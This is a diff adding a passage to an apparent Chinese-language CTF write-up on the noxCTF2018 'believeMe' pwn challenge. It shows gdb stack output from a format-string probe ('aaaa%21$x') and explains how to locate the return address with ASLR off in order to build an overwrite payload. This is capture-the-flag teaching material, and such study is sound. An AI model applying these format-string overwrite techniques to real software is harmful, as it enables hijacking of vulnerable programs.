@@ -100,3 +100,42 @@ void __noreturn noxFlag()
 ```
 
 当时就卡在这里没绕出去，经过队友提醒能不能改return地址，才发现思路走偏了
+
+我们gdb把断点下在printf调试一下，先查看下堆栈
+
+```bash
+gdb-peda$ stack 30
+0000| 0xffffcf1c --> 0x80487d8 (<main+129>:	add    esp,0x10)
+0004| 0xffffcf20 --> 0xffffcf44 ("aaaa%21$x")
+0008| 0xffffcf24 --> 0x804890c --> 0xa ('\n')
+0012| 0xffffcf28 --> 0xf7fb45a0 --> 0xfbad2288 
+0016| 0xffffcf2c --> 0x8f17 
+0020| 0xffffcf30 --> 0xffffffff 
+0024| 0xffffcf34 --> 0x2f ('/')
+0028| 0xffffcf38 --> 0xf7e0edc8 --> 0x2b76 ('v+')
+0032| 0xffffcf3c --> 0xffffd024 --> 0xffffd201 ("/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe")
+0036| 0xffffcf40 --> 0x8000 
+0040| 0xffffcf44 ("aaaa%21$x")
+0044| 0xffffcf48 ("%21$x")
+0048| 0xffffcf4c --> 0xf7000078 
+0052| 0xffffcf50 --> 0x1 
+0056| 0xffffcf54 --> 0x0 
+0060| 0xffffcf58 --> 0xf7e30a50 (<__new_exitfn+16>:	add    ebx,0x1835b0)
+0064| 0xffffcf5c --> 0x804885b (<__libc_csu_init+75>:	add    edi,0x1)
+0068| 0xffffcf60 --> 0x1 
+0072| 0xffffcf64 --> 0xffffd024 --> 0xffffd201 ("/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe")
+0076| 0xffffcf68 --> 0xffffd02c --> 0xffffd239 ("XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0")
+0080| 0xffffcf6c --> 0xed1acd00 
+0084| 0xffffcf70 --> 0xf7fb43dc --> 0xf7fb51e0 --> 0x0 
+0088| 0xffffcf74 --> 0xffffcf90 --> 0x1 
+0092| 0xffffcf78 --> 0x0 
+0096| 0xffffcf7c --> 0xf7e1a637 (<__libc_start_main+247>:	add    esp,0x10)
+--More--(25/30)
+0100| 0xffffcf80 --> 0xf7fb4000 --> 0x1b1db0 
+0104| 0xffffcf84 --> 0xf7fb4000 --> 0x1b1db0 
+0108| 0xffffcf88 --> 0x0 
+0112| 0xffffcf8c --> 0xf7e1a637 (<__libc_start_main+247>:	add    esp,0x10)
+0116| 0xffffcf90 --> 0x1 
+```
+
+我们可以看到在偏移112处return地址为0xFFFFCF8C，我们找到了一个与它偏移相近的并且能被泄露出来的地址，因为题目说了(No ASLR) ，所以return的地址是不会变化，我们可以先连上一次得到return地址构造payload来getflag
